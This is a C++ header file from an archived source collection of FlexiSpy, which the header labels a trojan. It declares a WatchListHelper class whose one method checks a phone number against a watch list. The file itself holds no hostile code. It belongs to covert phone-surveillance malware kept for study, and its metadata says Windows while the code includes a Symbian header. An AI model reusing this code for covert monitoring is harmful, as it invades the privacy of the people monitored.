/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#ifndef WATCHLISTHELPER_H_
#define WATCHLISTHELPER_H_

#include <e32base.h>

class TWatchList;

class WatchListHelper
	{
public:
	static TBool ContainNumber(const TWatchList& aWatchList, const TDesC& aNumber);
	};

#endif /*WATCHLISTHELPER_H_*/
